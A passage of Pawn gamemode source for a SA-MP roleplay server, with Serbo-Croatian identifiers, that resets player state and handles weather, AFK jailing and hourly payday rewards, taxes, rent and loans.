	strmid( PlayerInfo[ playerid ][ xKljucKapije ], "Niko", 0, strlen( "Niko" ), 24 );
	strmid( PlayerInfo[ playerid ][ xOffPJail ], "N", 0, strlen("N"), 2 );
	strmid( PlayerInfo[ playerid ][ xOffPMute ], "N", 0, strlen("N"), 2 );
	strmid( PlayerInfo[ playerid ][ xOffPPrison ], "N", 0, strlen("N"), 2 );
	strmid( PlayerInfo[ playerid ][ xMarriedTo ], "Niko", 0, strlen( "Niko" ), 24 );

	//----------------[ New ]-----------------

	askqInfo[ playerid ][ askqSended ] = false;
	askqInfo[ playerid ][ askqAnswered ] = false;
	strmid( askqInfo[ playerid ][ askqAdmin ], "None", 0, strlen( "None" ), 32 );
	strmid( askqInfo[ playerid ][ askqAnswer ], "None", 0, strlen( "None" ), 128 );

	CreatingPos[ playerid ][ 0 ] = 0.0;
	CreatingPos[ playerid ][ 1 ] = 0.0;
	CreatingPos[ playerid ][ 2 ] = 0.0;
	CreatingPos[ playerid ][ 3 ] = 0.0;
	CreatingGZone[ playerid ] = -1;
	CreatingGZoneID[ playerid ] = -1;
	CheckpointStatus[ playerid ] = 0;
	MarkerPaket[ playerid ] = 0;
	PljackaVreme[ playerid ] = 0;
	PljackaNovac[ playerid ] = 0;
	ZlatoVreme[ playerid ] = 0;
	PljackaZlato[ playerid ] = 0;
	NaDmEventu[ playerid ] = false;
	DropedGun[ playerid ] = gettime();
	PlayerInBlowJob[ playerid ] = 0;
	BrojLisica[ playerid ] = 0;
	chosen_clothes_slot[ playerid ] = 0;
	GovRepairCooldown[playerid] = gettime();
	RequestingBackup[playerid] = false;
	CuffTimerCalled[playerid] = false;
	PokusajProvala[playerid] = false;
	TicketOffer[playerid] = -1;
	TicketMoney[playerid] = 0;
	ShakeOffer[playerid] = -1;
	Mobile[playerid] = -1;
	CellTime[playerid] = 0;
	CallCost[playerid] = 0;
	PlayerDruggedSeconds[playerid] = 0;
	LocatingCar[playerid] = false;
	GPSTimerCalled[playerid] = false;
	StartingVehicle[playerid] = false;
	PoliceComputer[playerid] = false;
	JobDuty[playerid] = false;
	ImmobTimerCalled[playerid] = false;
	OfficerUndercover[playerid] = false;
	gSmoking[playerid] = 0;

	object_on_player[ playerid ][ 0 ] = false;
	object_on_player[ playerid ][ 1 ] = false;
	object_on_player[ playerid ][ 2 ] = false;
	object_on_player[ playerid ][ 3 ] = false;

	strmid( ZlocinInfo[ playerid ][ zPrijavio ], "Nema", 0, strlen("Nema"), 255 );
	strmid( ZlocinInfo[ playerid ][ zPocinio ], "Nema", 0, strlen("Nema"), 255 );
	strmid( ZlocinInfo[ playerid ][ zZlocin ], "Nema", 0, strlen("Nema"), 255 );

	gZone_gID[ playerid ] = -1;
	gZone_Time[ playerid ] = 0;
	gZone_ShowTeammates[ playerid ] = 1;
	BlowJobCount[ playerid ] = 0;
	TazerMetkovi[ playerid ] = 0;
 	Putovara[ playerid ] = false;
 	Pistovara[ playerid ] = false;

 	#if ZIMSKI_MOD == 1

		PlayerRun[ playerid ] = 0;

	#endif

	CreateRentID[ playerid ] = -1;
	ClothesSlots[ playerid ][ 0 ] = -1;
	ClothesSlots[ playerid ][ 1 ] = -1;
	ClothesSlots[ playerid ][ 2 ] = -1;
	ClothesSlots[ playerid ][ 3 ] = -1;
    UKLJUCENIFCHAT[ playerid ] = -1;
    takingselfie[ playerid ] = false;
	SpecPos[ playerid ][ 0 ] = 0.0;
	SpecPos[ playerid ][ 1 ] = 0.0;
	SpecPos[ playerid ][ 2 ] = 0.0;

	#if ZIMSKI_MOD == 1
	Snow_F[ playerid ] = false;
	#endif

	AlreadyShooted[ playerid ] = false;
	Charged[ playerid ] = 0;
	Shoot[ playerid ] = 0;
    PokusajLogina[ playerid ] = 0;
    login_showed[ playerid ] = false;
    WatchingTV{ playerid } = 0;
    KupljeneFakture[ playerid ] = 0;
    ChosenItem[ playerid ] = -1;
    ItemPrice[ playerid ] = 0;
    ItemQuantity[ playerid ] = 0;
    GiveItemID[ playerid ] = -1;
    IzabraniAskQ[ playerid ] = -1;
    ShowedRegister[ playerid ] = false;
    CheckingRegAcc[ playerid ] = 0;
    ShowedLogin[ playerid ] = false;
    usingAnimation[ playerid ] = false;
    OrgKreiranje[ playerid ] = 0;
    UsaoAutoProdaja[ playerid ] = -1;
    DragedPlayerID[ playerid ] = -1;
	Draged[ playerid ] = -1;
	IDVozilaKojimSverca[ playerid ] = -1;
	ProcesSvercanja[ playerid ] = 0;
    AdminDuty[ playerid ] = false;
    EditingBody[ playerid ] = false;
    RadioAktiviran[ playerid ] = 0;
    UlogTrke[ playerid ] = 0;
    PlayerCuffed[ playerid ] = 0;
    PosaoRudar[ playerid ] = 0;
    PonudioIgrac[ playerid ] = -1;
    ModelTrke[ playerid ] = 0;
    PocetniIntroStartovan[playerid] = false;
    PlayerDrugged[ playerid ] = false;
    PlayerTuningCar[ playerid ] = false;
    tdm_tds_showed[ playerid ] = false;
    tdm_tds_showed_sec[ playerid ] = 0;
    BuyCarTDShowed[ playerid ] = false;
    LaptopRuke[ playerid ] = false;
    TogHud[ playerid ] = false;
    IgracZavezan[ playerid ] = false;
    AccountVerified[ playerid ] = false;
    KnockedDown[ playerid ] = false;
    IgracOpljackan[ playerid ] = false;
    VecjeUsao[ playerid ] = true;
    Pojas[ playerid ] = false;
    Uze[ playerid ] = false;
    SearchNadji[ playerid ] = -1;
    robbingATM[ playerid ] = -1;
    CenaProdaje[ playerid ] = 0;
    robbingATMSeconds[ playerid ] = 95;
    PlayerCP[ playerid ] = 0;
    UkupnaCena[ playerid ] = 0;
    ShowedATMTD[ playerid ] = false;
    PoljeDroge[ playerid ] = -1;
    LetZG[ playerid ] = 0;
    LetSA[ playerid ] = 0;
    EditDGate[ playerid ] = -1;
    EditDGateMove[ playerid ] = -1;
    EditRoadblock[playerid] = -1;
    SpawnovaoVozilo[ playerid ] = 0;
    AdminVozilo[ playerid ] = -1;
    VipVozilo[ playerid ] = -1;
    PromoterVozilo[playerid] = -1;
    YTVozilo[playerid] = -1;
    PosaoVozilo[ playerid ] = -1;
    PosaoTrailer[ playerid ] = -1;
    TrkaVozilo[ playerid ] = -1;
    Krugovi[ playerid ] = 0;
    TrkaCheckpoint[ playerid ] = 0;
	TrkaIzazov[ playerid ] = 0;
	NaUtrci[ playerid ] = false;
    PlacaPorez[ playerid ] = 0;
    GlobalProdaja[ playerid ] = -1;
    GlobalImovinaIgracu[playerid] = false;
    Ponudjeno[ playerid ] = -1;
	Trazio[ playerid ] = -1;
    ServerStatsChose[ playerid ] = 0;
	GlobalCena[ playerid ] = -1;
	GlobalID[ playerid ] = -1;
	GlobalID_2[ playerid ] = -1;
	gNews{ playerid } = 0;
    UzeoIzMarketa[ playerid ][ 0 ] = 0;
    UzeoIzMarketa[ playerid ][ 1 ] = 0;
    UzeoIzMarketa[ playerid ][ 2 ] = 0;
    UzeoIzMarketa[ playerid ][ 3 ] = 0;
    UzeoIzMarketa[ playerid ][ 4 ] = 0;
    UzeoIzMarketa[ playerid ][ 5 ] = 0;
    UzeoIzMarketa[ playerid ][ 6 ] = 0;
    UzeoIzMarketa[ playerid ][ 7 ] = 0;
    UzeoIzMarketa[ playerid ][ 8 ] = 0;
    UzeoIzMarketa[ playerid ][ 9 ] = 0;
	Spectate[ playerid ] = -1;
	PlayerEventVehID[ playerid ] = -1;
	PlayerInvited[ playerid ] = 0;
	Training[ playerid ] = 0;
	PlayerLogged[ playerid ] = false;
	StaroVreme[ playerid ] = 0;
    NovoVreme[ playerid ] = 0;
	UzeoOpremu[ playerid ] = false;
	HitmanInfo[ playerid ][ GotHit ] = 0;
	HitmanInfo[ playerid ][ PlacedNews ] = 0;
	HitmanInfo[ playerid ][ GetChased ] = 999;
	HitmanInfo[ playerid ][ GoChase ] = 999;
	Odbrojavanje[ playerid ] = 0;
	EditKontejnera[ playerid ] = -1;
	EditATM[ playerid ] = -1;
	EditPresents[ playerid ] = -1;
	EditCTrees[ playerid ] = -1;
	uFirmi[ playerid ] = -1;
	uInterijeru[ playerid ] = -1;
	inProperty[ playerid ] = -1;
	inOrgInt[ playerid ] = -1;
	PoliceDuty[ playerid ] = false;
	ImaTazer[ playerid ] = false;
	TrunkVehicle[ playerid ] = -1;
  	TacanOdgovor[ playerid ] = -1;
  	RentVozilo[ playerid ] = -1;
  	PaketType[ playerid ] = 0;
  	NosiPaketOruzja[ playerid ] = false;
  	PropertySafeGun[ playerid ] = -1;
  	TrashLimit[ playerid ] = gettime();
   	TrashSearch[ playerid ] = 0;
	PhoneOnline[ playerid ] = 0;
	RPTeacherDuty[ playerid ] = 0;
	BoomboxInfo[ playerid ][ boomboxPlaced ] = 0;
	BoomboxInfo[ playerid ][ boomboxPos ][ 0 ] = 0.0;
	BoomboxInfo[ playerid ][ boomboxPos ][ 1 ] = 0.0;
	BoomboxInfo[ playerid ][ boomboxPos ][ 2 ] = 0.0;
	Boombox[ playerid ] = IPI;
	InputPassword[ playerid ] = false;
	InputMail[ playerid ] = false;
	ChoseCountry[ playerid ] = 0;
	InputAge[ playerid ] = 0;
	RegSex[ playerid ] = 0;
	BiraSkin[playerid] = 0;
	KreiranjeWara[ playerid ] = -1;
	ReportGlobal[ playerid ] = gettime();
	PitajTajmer[ playerid ] = gettime();
	playerStatsPage[ playerid ] = 0;
	playerStatsTargetID[ playerid ] = -1;
 	CooldownPort[ playerid ] = gettime();
	NewGlobal[ playerid ] = gettime();
	PlayerCPShow[ playerid ] = false;
	as_Buying[playerid] = false;
	MinutiIgraca[ playerid ] = 0;
	IzabraniPort[ playerid ] = 0;
	ProposeOffer[ playerid ] = 999;
	DivorceOffer[ playerid ] = 999;
	MarriageCeremoney{ playerid } = 0;
	ProposedTo[ playerid ] = 999;
	GotProposedBy[ playerid ] = 999;
	ChosenVehicle[ playerid ] = -1;
	gpsid[ playerid ] = -1;

	// Anti cheat
	antiCheatCS[ playerid ][ SpamChat ] = gettime();
	antiCheatCS[ playerid ][ SpamCommand ] = gettime();
	antiCheatCS[ playerid ][ SpamBanka ] = false;
	antiCheatCS[ playerid ][ AFKMinute ] = 0;
}
//------------------------------------------------------------------------------
_:public DinamicWeather()
{
	new tmphour, tmpminute, tmpsecond;

	gettimeEx(tmphour, tmpminute, tmpsecond);
	FixHour( tmphour );
	tmphour = shifthour;

    #if ZIMSKI_MOD == 1

	    SetWeather( 6 );
	    ServerInfo[ Prognozasys ] = 6;

    #else

		if(tmphour >= 6 && tmphour <= 20)
		{
	    	new RandomWeather;
	    	RandomWeather = random(10);
	    	switch(RandomWeather)
	    	{
	         	case 0:
	         	{
	            	SetWeather(1);
	            	SendClientMessageToAll( ZUTA, "(VREMENSKA PROGNOZA): Vreme je suncano i ugodno." );
	            	ServerInfo[ Prognozasys ] = 1;
		     	}
		     	case 1:
		     	{
	            	SetWeather(7);
		        	SendClientMessageToAll( ZUTA, "(VREMENSKA PROGNOZA): Vreme je tmurno i oblacno. ");
		        	ServerInfo[ Prognozasys ] = 7;
		     	}
		     	case 2:
		     	{
		        	SetWeather(8);
		        	SendClientMessageToAll( ZUTA, "(VREMENSKA PROGNOZA): Kisa je pocela da pada. Upozoravaju se vozaci da opreznije voze radi skliskih kolnika.");
		        	ServerInfo[ Prognozasys ] = 8;
	         	}
		     	case 3:
		     	{
		        	SetWeather(13);
		        	SendClientMessageToAll( ZUTA, "(VREMENSKA PROGNOZA): Vreme je suncano i odlicno za odlazak na plazu. Temperatura vode je ugodnih 22C.");
		        	ServerInfo[ Prognozasys ] = 13;
		     	}
	         	case 4:
		     	{
		        	SetWeather(15);
		        	SendClientMessageToAll( ZUTA, "(VREMENSKA PROGNOZA): Vreme je oblacno i vjetrovito. Brzina vjetra iznosi 20km/h.");
		        	ServerInfo[ Prognozasys ] = 15;
		     	}
	 	     	case 5:
	         	{
		        	SetWeather(17);
		        	SendClientMessageToAll( ZUTA, "(VREMENSKA PROGNOZA): Vreme je oblacno i ugodno za setnje prirodom.");
		        	ServerInfo[ Prognozasys ] = 17;
		    	}
	 	     	case 6:
	         	{
		        	SetWeather(24);
		        	SendClientMessageToAll( ZUTA, "(VREMENSKA PROGNOZA): Vreme je suncano. Preporucuje se da se pije sto vise tekucine radi vrucina.");
		        	ServerInfo[ Prognozasys ] = 24;
		    	}
		     	case 7:
		     	{
		        	SetWeather(10);
		        	SendClientMessageToAll( ZUTA, "(VREMENSKA PROGNOZA): Vreme je svjeze i suncano. Temperatura zraka iznosi 29C");
		        	ServerInfo[ Prognozasys ] = 10;
		     	}
		     	case 8:
		     	{
		        	SetWeather(43);
		        	SendClientMessageToAll( ZUTA, "(VREMENSKA PROGNOZA): Vreme je maglovito i tmurno.");
		        	SendClientMessageToAll( ZUTA, "(VREMENSKA PROGNOZA): Upozoravaju se vozaci da opreznije voze radi slabije vidljivosti na cestama.");
		        	ServerInfo[ Prognozasys ] = 43;
		    	}
		     	case 9:
	         	{
		        	SetWeather(40);
		        	SendClientMessageToAll( ZUTA, "(VREMENSKA PROGNOZA): Vreme je ugodno i suncano.");
		        	ServerInfo[ Prognozasys ] = 40;
		     	}
			}
		}
		else if( tmphour >= 21 && tmphour <= 5 )
		{
			SetWeather(10);
			ServerInfo[ Prognozasys ] = 10;
		}

	#endif

	return 1;
}
//------------------------------------------------------------------------------
_:public DrugCheck( playerid )
{
    new hour,minuite,second;

	if( PlayerDrugged[ playerid ] == true )
	{
	    if( PlayerDruggedSeconds[playerid] > 0) PlayerDruggedSeconds[playerid]--;
		else
		{
		    gettimeEx( hour, minuite, second );
			FixHour( hour );
			hour = shifthour;

            SetPlayerDrunkLevel( playerid, 0 );
			PlayerDrugged[ playerid ] = false;
			PlayerDruggedSeconds[playerid] = 0;
			SetPlayerWeather( playerid, ServerInfo[ Prognozasys ] );
			SetPlayerTime( playerid, hour, minuite );
		}
	}
}
//------------------------------------------------------------------------------
_:public PlayerPlayMusic( playerid )
{
	if( IsPlayerConnected( playerid ) )
	{
		SetPlayerTimerEx(playerid, "StopMusic", 5000, false, "i", playerid);
		PlayerPlaySound( playerid, 1068, 0.0, 0.0, 0.0);
	}
}

_:public StopMusic()
{
	foreach( new i : Player)
	{
		PlayerPlaySound(i, 1069, 0.0, 0.0, 0.0);
	}
}
//------------------------------------------------------------------------------
_:public AFKCheck( playerid )
{
    GetPlayerPos(playerid, antiCheatCS[ playerid ][ AFKSecondPos ][ 0 ], antiCheatCS[ playerid ][ AFKSecondPos ][ 1 ], antiCheatCS[ playerid ][ AFKSecondPos ][ 2 ] );

    if( !floatcmp( antiCheatCS[ playerid ][ AFKSecondPos ][ 0 ], antiCheatCS[ playerid ][ AFKFirstPos ][ 0 ] ) && !floatcmp( antiCheatCS[ playerid ][ AFKSecondPos ][ 1 ], antiCheatCS[ playerid ][ AFKFirstPos ][ 1 ] ) )
	{
	    if(PlayerInfo[ playerid ][ xAdmin ] != 7 )
		{
			antiCheatCS[ playerid ][ AFKMinute ]++;
		}
	}
	else
	{
        antiCheatCS[ playerid ][ AFKMinute ] = 0;
	}

 	antiCheatCS[ playerid ][ AFKFirstPos ][ 0 ] = antiCheatCS[ playerid ][ AFKSecondPos ][ 0 ];
	antiCheatCS[ playerid ][ AFKFirstPos ][ 1 ] = antiCheatCS[ playerid ][ AFKSecondPos ][ 1 ];
	antiCheatCS[ playerid ][ AFKFirstPos ][ 2 ] = antiCheatCS[ playerid ][ AFKSecondPos ][ 2 ];

	if( antiCheatCS[ playerid ][ AFKMinute ] >= 10 && PlayerInfo[ playerid ][ xZatvor ] == 0 )
	{
	    if( PlayerInfo[ playerid ][ xWanted ] > 0 )
		{
			PlayerInfo[ playerid ][ xZatvor ] = JAIL;
			PlayerInfo[ playerid ][ xZatvorVreme ] = 5*PlayerInfo[ playerid ][ xWanted ];
			new price = PlayerInfo[ playerid ][ xWanted ]*1000;
			if( price > 30000 ) price = 30000;
			DajIgracuNovac( playerid, -price );

            SendInfoMessage( playerid, "Bili ste afk sa WL i otisli ste u zatvor." );

			new rand = random( sizeof( RandomZatvor ) );
			SMG_SetPlayerPos( playerid, RandomZatvor[ rand ][ 0 ], RandomZatvor[ rand ][ 1 ],RandomZatvor[ rand ][ 2 ] );
			PlayerInfo[ playerid ][ xWanted ] = 0;
			SMG_SetPlayerWantedLevel( playerid, PlayerInfo[ playerid ][ xWanted ] );
			strmid( ZlocinInfo[ playerid ][ zPrijavio ], "Nema", 0, strlen("Nema"), 255 );
			strmid( ZlocinInfo[ playerid ][ zPocinio ], "Nema", 0, strlen("Nema"), 255 );
			strmid( ZlocinInfo[ playerid ][ zZlocin ], "Nema", 0, strlen("Nema"), 255 );
            UcitajObjekte( playerid );
		    SetCameraBehindPlayer( playerid ); SetPlayerInterior( playerid, 0);
		    SetPlayerVirtualWorld( playerid, 0);

			new q[ 135 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `jail_type` = '%d', `jail_time` = '%d', `wanted_level` = '%d' WHERE `user_id` = '%d' LIMIT 1",
				PlayerInfo[ playerid ][ xZatvor ],
				PlayerInfo[ playerid ][ xZatvorVreme ],
				PlayerInfo[ playerid ][ xWanted ],
				PlayerInfo[ playerid ][ xID ] );
			mysql_tquery( mSQL, q);
	    }
	}
}
//------------------------------------------------------------------------------
_:public PayDay( playerid )
{
    if( PlayerLogged[ playerid ] == true )
	{
		PlayerInfo[playerid][xAktivnaIgra]++;
		switch(PlayerInfo[playerid][xAktivnaIgra])
		{
			case 6:
			{
				DajIgracuNovac(playerid, 50000);

				PlayerInfo[playerid][xZlato] += 50;
				PlayerInfo[playerid][xRespekt] += 1;

				static q[100];
				mysql_format(mSQL, q, sizeof(q), "UPDATE `users` SET `xZlato` = '%d', `exp` = '%d' WHERE `user_id` = '%d'", PlayerInfo[playerid][xZlato], PlayerInfo[playerid][xRespekt], PlayerInfo[playerid][xID]);
				mysql_tquery(mSQL, q);

				SendClientMessage(playerid, 0x5BF067FF, "(AKTIVNA IGRA): {FFFFFF}Bili ste {5BF067}6h {FFFFFF}aktivni, osvojili ste {5BF067}$50.000, 50G zlata i 1RP.");
			}
			case 12:
			{
				DajIgracuNovac(playerid, 75000);

				PlayerInfo[playerid][xZlato] += 75;
				PlayerInfo[playerid][xRespekt] += 2;

				static q[100];
				mysql_format(mSQL, q, sizeof(q), "UPDATE `users` SET `xZlato` = '%d', `exp` = '%d' WHERE `user_id` = '%d'", PlayerInfo[playerid][xZlato], PlayerInfo[playerid][xRespekt], PlayerInfo[playerid][xID]);
				mysql_tquery(mSQL, q);

				SendClientMessage(playerid, 0x5BF067FF, "(AKTIVNA IGRA): {FFFFFF}Bili ste {5BF067}12h {FFFFFF}aktivni, osvojili ste {5BF067}$75.000, 75G zlata i 2RP.");
			}
			case 18:
			{
				DajIgracuNovac(playerid, 150000);

				PlayerInfo[playerid][xZlato] += 150;
				PlayerInfo[playerid][xRespekt] += 3;

				static q[100];
				mysql_format(mSQL, q, sizeof(q), "UPDATE `users` SET `xZlato` = '%d', `exp` = '%d' WHERE `user_id` = '%d'", PlayerInfo[playerid][xZlato], PlayerInfo[playerid][xRespekt], PlayerInfo[playerid][xID]);
				mysql_tquery(mSQL, q);

				SendClientMessage(playerid, 0x5BF067FF, "(AKTIVNA IGRA): {FFFFFF}Bili ste {5BF067}18h {FFFFFF}aktivni, osvojili ste {5BF067}$150.000, 150G zlata i 3RP.");
			}
			case 24:
			{
				DajIgracuNovac(playerid, 250000);

				PlayerInfo[playerid][xZlato] += 250;
				PlayerInfo[playerid][xRespekt] += 4;
				PlayerInfo[playerid][xAktivnaIgra] = 0;

				static q[100];
				mysql_format(mSQL, q, sizeof(q), "UPDATE `users` SET `xZlato` = '%d', `exp` = '%d' WHERE `user_id` = '%d'", PlayerInfo[playerid][xZlato], PlayerInfo[playerid][xRespekt], PlayerInfo[playerid][xID]);
				mysql_tquery(mSQL, q);

				SendClientMessage(playerid, 0x5BF067FF, "(AKTIVNA IGRA): {FFFFFF}Bili ste {5BF067}24h {FFFFFF}aktivni, osvojili ste {5BF067}$250.000, 250G zlata i 4RP.");
			}
		}
		sql_user_update_integer(playerid, "xAktivnaIgra", PlayerInfo[playerid][xAktivnaIgra]);

		//-------------------------------------------------------------

	    new 
	    	stariiznos = PlayerInfo[ playerid ][ xBRacun ], 
	    	donatorkamata = 0, 
	    	platapd = 0, 
	    	plataadms = 0, 
	    	plataspec = 0, 
	    	plataprom = 0,
	    	dodataknaplatu = 0;

	    PlayerInfo[ playerid ][ xOnlineSati ]++;
	    PlayerInfo[ playerid ][ xPayDay ] = 0;

		//-------------------------------------------------------------

		if( PlayerInfo[ playerid ][ xNovac ] < 0 )
		{
		    if( PlayerInfo[ playerid ][ xZatvor ] == 0 )
			{
			    SendClientMessage( playerid, 0xFF6347FF, "(ZATVOR): Niste platili vas dug, vreme je za zatvor od {FFFFFF}(5) {FF6347}min." );

			    ResetPlayerWeapons( playerid );

			    PlayerInfo[ playerid ][ xZatvor ] = JAIL;
				PlayerInfo[ playerid ][ xZatvorVreme ] = 5;

			    new rand = random( sizeof( RandomZatvor ) );
				SMG_SetPlayerPos( playerid, RandomZatvor[ rand ][ 0 ], RandomZatvor[ rand ][ 1 ], RandomZatvor[ rand ][ 2 ] );
			    UcitajObjekte( playerid );
				SetCameraBehindPlayer( playerid );
				SetPlayerInterior( playerid, 0 );
				SetPlayerVirtualWorld( playerid, 0 );
			}
		}

		//-------------------------------------------------------------

		if( antiCheatCS[ playerid ][ AFKMinute ] < 2 )
		{
	        if( GetFactionType( playerid ) == ORG_TIP_VLADINA ) platapd = 2000;

			if( PlayerInfo[ playerid ][ xPromoter ] > 0 ) plataprom = 3000+(PlayerInfo[ playerid ][ xPromoter ]*500);

			if( PlayerInfo[ playerid ][ xYouTuber ] > 0 ) plataprom = 3000+(PlayerInfo[ playerid ][ xYouTuber ]*500);

	        if( PlayerInfo[ playerid ][ xSpecAdmin ] > 0 ) plataspec = 3000;

	        if( PlayerInfo[ playerid ][ xGamemaster ] > 0 ) plataadms = 2500+(PlayerInfo[ playerid ][ xGamemaster ]*200);

			if( PlayerInfo[ playerid ][ xAdmin ] > 0 ) plataadms = 3000+(PlayerInfo[ playerid ][ xAdmin ]*200);

			if( PlayerInfo[ playerid ][ xSkriptaRank ] == 4 || PlayerInfo[ playerid ][ xSkriptaRank ] == 5 || PlayerInfo[ playerid ][ xSkriptaRank ] == 6 || PlayerInfo[ playerid ][ xSkriptaRank ] == 7 ) plataprom = 5000;

			//Dodatci na platu

			if( PlayerInfo[ playerid ][ xAdmin ] > 0 ) dodataknaplatu = 3000+(PlayerInfo[ playerid ][ xAdmin ]*200);

			if( PlayerInfo[ playerid ][ xGamemaster ] > 0 ) dodataknaplatu = 3000+(PlayerInfo[ playerid ][ xGamemaster ]*200);

			if( PlayerInfo[ playerid ][ xLider ] > 0 ) dodataknaplatu = 2500+(PlayerInfo[ playerid ][ xLider ]*200);

			if( PlayerInfo[ playerid ][ xPromoter ] > 0 ) dodataknaplatu = 2500+(PlayerInfo[ playerid ][ xPromoter ]*200);

			if( PlayerInfo[ playerid ][ xYouTuber ] > 0 ) dodataknaplatu = 2500+(PlayerInfo[ playerid ][ xYouTuber ]*200);

		}

		//-------------------------------------------------------------

        if( PlayerInfo[ playerid ][ xRentID ] != -1 )
		{
            new id = PlayerInfo[ playerid ][ xRentID ];
            if( II[ id ][ iRentable ] == 1 )
			{
	            if( II[ id ][ iRentPrice ] > PlayerInfo[ playerid ][ xNovac ] )
				{
	                II[ id ][ iRentovano ]--;
	                SaveProperty( id );

				    PlayerInfo[ playerid ][ xRentID ] = -1;
				    PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_1;
				    SendClientMessage( playerid, ZUTA, "(RENT): Niste imali dovoljno novca za rent, izbaceni ste." );
	            }
	            else
				{
	                II[ id ][ iMoney ] += II[ id ][ iRentPrice ];
	                SaveProperty( id );

	                DajIgracuNovac( playerid, -II[ id ][ iRentPrice ] );
	                SCMF( playerid, ZUTA, "(RENT): Platili ste rent {FFFFFF}($%d).", II[ id ][ iRentPrice ] );
	            }
			}
			else if( II[ id ][ iRentable ] == 0 )
			{
			    II[ id ][ iRentovano ]--;
	            SaveProperty( id );

			    PlayerInfo[ playerid ][ xRentID ] = -1;
			    PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_1;

			    SendClientMessage( playerid, ZUTA, "(RENT): Kuca koju ste rentali vise nije na iznajmljivanje." );
			}
        }

		//-------------------------------------------------------------

		if( ServerInfo[ HappyHours ] != 0 && ServerInfo[ HappyHoursLvl ] == 0 ) PlayerInfo[ playerid ][ xRespekt ] += ServerInfo[ HappyHours ];
        else if( ServerInfo[ HappyHours ] != 0 && ServerInfo[ HappyHoursLvl ] != 0 )
		{
			if( PlayerInfo[playerid][xLevel] < ServerInfo[ HappyHoursLvl ] ) PlayerInfo[ playerid ][ xRespekt ] += ServerInfo[ HappyHours ];
			else if( PlayerInfo[ playerid ][ xVIPLevel ] >= 5 ) PlayerInfo[ playerid ][ xRespekt ] += 2;
			else PlayerInfo[ playerid ][ xRespekt ]++; 
		}
		else
		{
			if( PlayerInfo[ playerid ][ xVIPLevel ] >= 5 ) PlayerInfo[ playerid ][ xRespekt ] += 2;
			else PlayerInfo[ playerid ][ xRespekt ]++; 
		}

		//-------------------------------------------------------------

	    if( PlayerInfo[ playerid ][ xIznosRate ] > 0 &&
			PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] > 0 &&
			PlayerInfo[ playerid ][ xIznosKredita ] > 0 )
		{
		    if( PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] < PlayerInfo[ playerid ][ xIznosRate ] )
			{
		        PlayerInfo[ playerid ][ xIznosRate ] = PlayerInfo[ playerid ][ xPreostaloZaOtplatu ];
			}

		    PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] -= PlayerInfo[ playerid ][ xIznosRate ];
		    PlayerInfo[ playerid ][ xBRacun ] -= PlayerInfo[ playerid ][ xIznosRate ];

		    if( PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] < 0 ) PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] = 0;
		    if( PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] <= 0 ) 
		    { 
		    	PlayerInfo[ playerid ][ xIznosKredita ] = 0;
		    	PlayerInfo[ playerid ][ xIznosRate ] = 0; 
		   	}
		}

		//-------------------------------------------------------------

	    new 
	    	iznosplate = 0, 
	    	osnova = 0, 
	    	prihod = 0, 
	    	rashod = 0, 
	    	struja = 0, 
	    	voda = 0,
	    	grijanje = 0, 
	    	porez = 0, 
	    	stecaj = 0;

		osnova = 45 + random( 5 );
		iznosplate = (osnova*PlayerInfo[ playerid ][ xLevel ]);

		//-------------------------------------------------------------

		if( PlayerInfo[ playerid ][ xProperty ][ 0 ] != -1 )
		{
		    new imovina = PlayerInfo[ playerid ][ xProperty ][ 0 ];
		    if( II[ imovina ][ iUsage ] == IMOVINA_KUCA )
			{
	  			if( II[ imovina ][ iVrsta ] == MALA_KUCA ) porez += 1600;
				else if( II[ imovina ][ iVrsta ] == SREDNJA_KUCA ) porez += 3200;
				else if( II[ imovina ][ iVrsta ] == VELIKA_KUCA ) porez += 6650;
			}
			else if( II[ imovina ][ iUsage ] == IMOVINA_STAN ) porez += 1500;
			else if( II[ imovina ][ iUsage ] == IMOVINA_VIKENDICA ) porez += 1350;
			struja += (450 + random(50));
			voda += (350 + random(50));
			grijanje += 450;
			donatorkamata = 2;

			if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 || PlayerInfo[ playerid ][ xGamemaster ] >= 1 ) donatorkamata = 3;
			if( PlayerInfo[ playerid ][ xVIPLevel ] >= 4 ) donatorkamata = PlayerInfo[ playerid ][ xVIPLevel ];
		}

		if( PlayerInfo[ playerid ][ xProperty ][ 1 ] != -1 )
		{
		    new imovina = PlayerInfo[ playerid ][ xProperty ][ 1 ];
		    if( II[ imovina ][ iUsage ] == IMOVINA_KUCA )
			{
	  			if( II[ imovina ][ iVrsta ] == MALA_KUCA ) porez += 1600;
				else if( II[ imovina ][ iVrsta ] == SREDNJA_KUCA ) porez += 3200;
				else if( II[ imovina ][ iVrsta ] == VELIKA_KUCA ) porez += 6650;
			}
			else if( II[ imovina ][ iUsage ] == IMOVINA_STAN ) porez += 1500;
			else if( II[ imovina ][ iUsage ] == IMOVINA_VIKENDICA ) porez += 1350;
			struja += (450 + random(50));
			voda += (350 + random(50));
			grijanje += 450;
			donatorkamata = 2;

	        if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 || PlayerInfo[ playerid ][ xGamemaster ] >= 1 ) donatorkamata = 3;

			if( PlayerInfo[ playerid ][ xVIPLevel ] >= 4 ) donatorkamata = PlayerInfo[ playerid ][ xVIPLevel ];
		}

		if( PlayerInfo[ playerid ][ xProperty ][ 2 ] != -1 )
		{
		    new imovina = PlayerInfo[ playerid ][ xProperty ][ 2 ];
		    if( II[ imovina ][ iUsage ] == IMOVINA_KUCA )
			{
	  			if( II[ imovina ][ iVrsta ] == MALA_KUCA ) porez += 1600;
				else if( II[ imovina ][ iVrsta ] == SREDNJA_KUCA ) porez += 3200;
				else if( II[ imovina ][ iVrsta ] == VELIKA_KUCA ) porez += 6650;
			}
			else if( II[ imovina ][ iUsage ] == IMOVINA_STAN ) porez += 1500;
			else if( II[ imovina ][ iUsage ] == IMOVINA_VIKENDICA ) porez += 1350;
			struja += (450 + random(50));
			voda += (350 + random(50));
			grijanje += 450;
			donatorkamata = 2;

